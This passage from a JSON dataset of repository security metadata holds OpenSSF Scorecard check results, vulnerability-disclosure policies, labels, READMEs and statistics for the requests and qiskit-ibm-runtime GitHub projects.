                    "details": [
                        "Warn: release artifact v2.32.3 not signed: https://api.github.com/repos/psf/requests/releases/158021607",
                        "Warn: release artifact v2.32.2 not signed: https://api.github.com/repos/psf/requests/releases/156747852",
                        "Warn: release artifact v2.32.1 not signed: https://api.github.com/repos/psf/requests/releases/156747736",
                        "Warn: release artifact v2.32.0 not signed: https://api.github.com/repos/psf/requests/releases/156543325",
                        "Warn: release artifact v2.31.0 not signed: https://api.github.com/repos/psf/requests/releases/103832205",
                        "Warn: release artifact v2.32.3 does not have provenance: https://api.github.com/repos/psf/requests/releases/158021607",
                        "Warn: release artifact v2.32.2 does not have provenance: https://api.github.com/repos/psf/requests/releases/156747852",
                        "Warn: release artifact v2.32.1 does not have provenance: https://api.github.com/repos/psf/requests/releases/156747736",
                        "Warn: release artifact v2.32.0 does not have provenance: https://api.github.com/repos/psf/requests/releases/156543325",
                        "Warn: release artifact v2.31.0 does not have provenance: https://api.github.com/repos/psf/requests/releases/103832205"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:23",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:24",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:18",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/lint.yml:6",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/run-tests.yml:6",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/requests/requests/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Vulnerability Disclosure\n\nIf you think you have found a potential security vulnerability in\nrequests, please email [Nate](mailto:nate.prewitt@gmail.com)\nand [Seth](mailto:sethmichaellarson@gmail.com) directly.\n**Do not file a public issue.**\n\nOur PGP Key fingerprints are:\n\n- 8722 7E29 AD9C FF5C FAC3  EA6A 44D3 FF97 B80D C864 ([@nateprewitt](https://keybase.io/nateprewitt))\n\n- EDD5 6765 A9D8 4653 CBC8  A134 51B0 6736 1740 F5FC ([@sethmlarson](https://keybase.io/sethmlarson))\n\nYou can also contact us on [Keybase](https://keybase.io) with the\nprofiles above if desired.\n\nIf English is not your first language, please try to describe the\nproblem and its impact to the best of your ability. For greater detail,\nplease use your native language and we will try our best to translate it\nusing online services.\n\nPlease also include the code you used to find the problem and the\nshortest amount of code necessary to reproduce it.\n\nPlease do not disclose this to anyone else. We will retrieve a CVE\nidentifier if necessary and give you full credit under whatever name or\nalias you provide. We will only request an identifier when we have a fix\nand can publish it in a release.\n\nWe will respect your privacy and will only publicize your involvement if\nyou grant us permission.\n\n## Process\n\nThis following information discusses the process the requests project\nfollows in response to vulnerability disclosures. If you are disclosing\na vulnerability, this section of the documentation lets you know how we\nwill respond to your disclosure.\n\n### Timeline\n\nWhen you report an issue, one of the project members will respond to you\nwithin two days *at the outside*. In most cases responses will be\nfaster, usually within 12 hours. This initial response will at the very\nleast confirm receipt of the report.\n\nIf we were able to rapidly reproduce the issue, the initial response\nwill also contain confirmation of the issue. If we are not, we will\noften ask for more information about the reproduction scenario.\n\nOur goal is to have a fix for any vulnerability released within two\nweeks of the initial disclosure. This may potentially involve shipping\nan interim release that simply disables function while a more mature fix\ncan be prepared, but will in the vast majority of cases mean shipping a\ncomplete release as soon as possible.\n\nThroughout the fix process we will keep you up to speed with how the fix\nis progressing. Once the fix is prepared, we will notify you that we\nbelieve we have a fix. Often we will ask you to confirm the fix resolves\nthe problem in your environment, especially if we are not confident of\nour reproduction scenario.\n\nAt this point, we will prepare for the release. We will obtain a CVE\nnumber if one is required, providing you with full credit for the\ndiscovery. We will also decide on a planned release date, and let you\nknow when it is. This release date will *always* be on a weekday.\n\nAt this point we will reach out to our major downstream packagers to\nnotify them of an impending security-related patch so they can make\narrangements. In addition, these packagers will be provided with the\nintended patch ahead of time, to ensure that they are able to promptly\nrelease their downstream packages. Currently the list of people we\nactively contact *ahead of a public release* is:\n\n-   Jeremy Cline, Red Hat (@jeremycline)\n-   Daniele Tricoli, Debian (@eriol)\n\nWe will notify these individuals at least a week ahead of our planned\nrelease date to ensure that they have sufficient time to prepare. If you\nbelieve you should be on this list, please let one of the maintainers\nknow at one of the email addresses at the top of this article.\n\nOn release day, we will push the patch to our public repository, along\nwith an updated changelog that describes the issue and credits you. We\nwill then issue a PyPI release containing the patch.\n\nAt this point, we will publicise the release. This will involve mails to\nmailing lists, Tweets, and all other communication mechanisms available\nto the core team.\n\nWe will also explicitly mention which commits contain the fix to make it\neasier for other distributors and users to easily patch their own\nversions of requests if upgrading is not an option.\n",
        "project_all_labels": [
            "3.0",
            "actions/autoclose-feat",
            "actions/autoclose-qa",
            "Breaking API Change",
            "Bug",
            "Contributor Friendly",
            "dependencies",
            "Do Not Merge",
            "Documentation",
            "Feature Request",
            "Fixed",
            "GAE Support",
            "github_actions",
            "Minion Seal of Approval",
            "Needs BDFL Input",
            "Needs Info",
            "Needs More Information",
            "needs rebase",
            "Not Ready To Merge",
            "Planned",
            "Please Review",
            "PR(s) available",
            "PR(s) Wanted",
            "Propose Close",
            "Question/Not a bug",
            "Ready To Merge",
            "silly-but-understandable",
            "spam"
        ],
        "README_content": "# Requests\n\n**Requests** is a simple, yet elegant, HTTP library.\n\n```python\n>>> import requests\n>>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))\n>>> r.status_code\n200\n>>> r.headers['content-type']\n'application/json; charset=utf8'\n>>> r.encoding\n'utf-8'\n>>> r.text\n'{\"authenticated\": true, ...'\n>>> r.json()\n{'authenticated': True, ...}\n```\n\nRequests allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your `PUT` & `POST` data — but nowadays, just use the `json` method!\n\nRequests is one of the most downloaded Python packages today, pulling in around `30M downloads / week`— according to GitHub, Requests is currently [depended upon](https://github.com/psf/requests/network/dependents?package_id=UGFja2FnZS01NzA4OTExNg%3D%3D) by `1,000,000+` repositories. You may certainly put your trust in this code.\n\n[![Downloads](https://static.pepy.tech/badge/requests/month)](https://pepy.tech/project/requests)\n[![Supported Versions](https://img.shields.io/pypi/pyversions/requests.svg)](https://pypi.org/project/requests)\n[![Contributors](https://img.shields.io/github/contributors/psf/requests.svg)](https://github.com/psf/requests/graphs/contributors)\n\n## Installing Requests and Supported Versions\n\nRequests is available on PyPI:\n\n```console\n$ python -m pip install requests\n```\n\nRequests officially supports Python 3.8+.\n\n## Supported Features & Best–Practices\n\nRequests is ready for the demands of building robust and reliable HTTP–speaking applications, for the needs of today.\n\n- Keep-Alive & Connection Pooling\n- International Domains and URLs\n- Sessions with Cookie Persistence\n- Browser-style TLS/SSL Verification\n- Basic & Digest Authentication\n- Familiar `dict`–like Cookies\n- Automatic Content Decompression and Decoding\n- Multi-part File Uploads\n- SOCKS Proxy Support\n- Connection Timeouts\n- Streaming Downloads\n- Automatic honoring of `.netrc`\n- Chunked HTTP Requests\n\n## API Reference and User Guide available on [Read the Docs](https://requests.readthedocs.io)\n\n[![Read the Docs](https://raw.githubusercontent.com/psf/requests/main/ext/ss.png)](https://requests.readthedocs.io)\n\n## Cloning the repository\n\nWhen cloning the Requests repository, you may need to add the `-c\nfetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see\n[this issue](https://github.com/psf/requests/issues/2690) for more background):\n\n```shell\ngit clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n```\n\n---\n\n[![Kenneth Reitz](https://raw.githubusercontent.com/psf/requests/main/ext/kr.png)](https://kennethreitz.org) [![Python Software Foundation](https://raw.githubusercontent.com/psf/requests/main/ext/psf.png)](https://www.python.org/psf)\n",
        "num_commits": 6317,
        "project_age_days": 5007,
        "project_created_at": "2011-02-13",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 401,
        "num_pull": 2550,
        "num_issues": 6522,
        "num_opening_issue": 249,
        "project_size(kB)": 13102,
        "num_stargazers": 52136,
        "num_watchers": 52136,
        "num_forks": 9326,
        "num_subscribers": 1326,
        "SecurityPolicy_created_at": "2020-01-19 15:41:09",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "2758124a13cddff7244b97b5ffe3fddabb90bc18",
                "url": "https://github.com/psf/requests/commit/2758124a13cddff7244b97b5ffe3fddabb90bc18",
                "date": "2020-02-28 03:33:09"
            },
            {
                "commit_id": "d2f65af033942a50890b29ab0159b385c426ea5b",
                "url": "https://github.com/psf/requests/commit/d2f65af033942a50890b29ab0159b385c426ea5b",
                "date": "2020-01-19 15:41:09"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism",
            "User guideline",
            "Projects practice"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "qiskit/qiskit-ibm-runtime",
        "project_url": "https://github.com/qiskit/qiskit-ibm-runtime",
        "SSF": {
            "date": "2024-10-29T20:47:13+07:00",
            "repo": {
                "name": "github.com/qiskit/qiskit-ibm-runtime",
                "commit": "9d01de5a0b0bef5d2aee0482c1d42f6a4a56adf5"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.7,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "Found 28/30 approved changesets -- score normalized to 9",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: ibm contributor org/company found, qutip contributor org/company found, NixOS contributor org/company found, Julia-i18n contributor org/company found, qiskit-community contributor org/company found, amazon contributor org/company found, softwoehr contributor org/company found, ibm @qiskit contributor org/company found, Qiskit contributor org/company found, givettech contributor org/company found, ibmresearch contributor org/company found, IBM-Quantum-prototypes contributor org/company found, IBM contributor org/company found, beetbox contributor org/company found, ibm quantum contributor org/company found, ibm research contributor org/company found, JuliaLang contributor org/company found, simple-dmrg contributor org/company found, Qiskit-Extensions contributor org/company found, PatchPorting contributor org/company found, qiskit - ibm quantum contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 21 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 22 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/deploy.yml:21"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:96: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:100: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yml:110: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:143: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yml:159: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/deploy.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/deploy.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/deploy.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/deploy.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/deploy.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/deploy.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/deploy.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/deploy.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e-tests.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/e2e-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e-tests.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/e2e-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests-qiskit-main.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/integration-tests-qiskit-main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests-qiskit-main.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/integration-tests-qiskit-main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/integration-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/integration-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/neko.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/neko.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-tests-terra-main.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/unit-tests-terra-main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-tests-terra-main.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/Qiskit/qiskit-ibm-runtime/unit-tests-terra-main.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:35",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:36",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:57",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:58",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:59",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:61",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:105",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:106",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:148",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:149",
                        "Warn: pipCommand not pinned by hash: .github/workflows/deploy.yml:36",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yml:20",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/e2e-tests.yml:49",
                        "Warn: pipCommand not pinned by hash: .github/workflows/e2e-tests.yml:50",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration-tests-qiskit-main.yml:50",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration-tests-qiskit-main.yml:51",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration-tests.yml:51",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration-tests.yml:52",
                        "Warn: pipCommand not pinned by hash: .github/workflows/unit-tests-terra-main.yml:37",
                        "Warn: pipCommand not pinned by hash: .github/workflows/unit-tests-terra-main.yml:40",
                        "Info:   0 out of  23 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   4 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  21 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/ci.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/deploy.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/e2e-tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/integration-tests-qiskit-main.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/integration-tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/neko.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/unit-tests-terra-main.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-34jh-p97f-mpxf",
                        "Warn: Project is vulnerable to: GHSA-g4mx-q9vg-27p4 / PYSEC-2023-212",
                        "Warn: Project is vulnerable to: GHSA-gwvm-45gx-3cf8 / PYSEC-2023-207",
                        "Warn: Project is vulnerable to: GHSA-mh33-7rrq-662w / PYSEC-2019-133",
                        "Warn: Project is vulnerable to: GHSA-r64q-w8jr-g9qp / PYSEC-2019-132",
                        "Warn: Project is vulnerable to: GHSA-v845-jxx5-vc9f / PYSEC-2023-192",
                        "Warn: Project is vulnerable to: GHSA-wqvq-5m8c-6g24 / PYSEC-2020-148",
                        "Warn: Project is vulnerable to: GHSA-www2-v7xj-xrc6 / PYSEC-2018-32",
                        "Warn: Project is vulnerable to: PYSEC-2021-108"
                    ],
                    "score": 1,
                    "reason": "9 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/qiskit/qiskit-ibm-runtime/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\n`qiskit-ibm-runtime` supports one minor version release at a time, both for bug\nand security fixes. For example, if the most recent release is 0.12.1, then the\n0.12.x release series is currently supported.\n\n## Reporting a Vulnerability\n\nTo report vulnerabilities, you can privately report a potential security issue\nvia the Github security vulnerabilities feature. This can be done here:\n\nhttps://github.com/Qiskit/qiskit-ibm-runtime/security/advisories\n\nPlease do **not** open a public issue about a potential security vulnerability.\n\nYou can find more details on the security vulnerability feature in the Github\ndocumentation here:\n\nhttps://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability\n",
        "project_all_labels": [
            "api action",
            "backport potential",
            "bug",
            "Changelog: API Change",
            "Changelog: Bugfix",
            "Changelog: Deprecation",
            "Changelog: New Feature",
            "Changelog: Removal",
            "discovery needed",
            "documentation",
            "duplicate",
            "enhancement",
            "Epic",
            "good first issue",
            "help wanted",
            "integration test",
            "on hold",
            "primitives",
            "priority: high",
            "priority: low",
            "priority: medium",
            "Qiskit 1.0",
            "server action",
            "technical debt",
            "type: feature request"
        ],
        "README_content": "# Qiskit Runtime IBM Client\n[![License](https://img.shields.io/github/license/Qiskit/qiskit-ibm-runtime.svg?style=popout-square)](https://opensource.org/licenses/Apache-2.0)\n[![CI](https://github.com/Qiskit/qiskit-ibm-runtime/actions/workflows/ci.yml/badge.svg)](https://github.com/Qiskit/qiskit-ibm-runtime/actions/workflows/ci.yml)\n[![](https://img.shields.io/github/release/Qiskit/qiskit-ibm-runtime.svg?style=popout-square)](https://github.com/Qiskit/qiskit-ibm-runtime/releases)\n[![](https://img.shields.io/pypi/dm/qiskit-ibm-runtime.svg?style=popout-square)](https://pypi.org/project/qiskit-ibm-runtime/)\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![Coverage Status](https://coveralls.io/repos/github/Qiskit/qiskit-ibm-runtime/badge.svg?branch=main)](https://coveralls.io/github/Qiskit/qiskit-ibm-runtime?branch=main)\n\n\n**Qiskit** is an open-source SDK for working with quantum computers at the level of extended quantum circuits, operators, and primitives.\n\n**Qiskit IBM Runtime** is a new environment offered by IBM Quantum that streamlines quantum computations and provides optimal\nimplementations of the Qiskit primitives `sampler` and `estimator` for IBM Quantum hardware. It is designed to use additional classical compute resources to execute 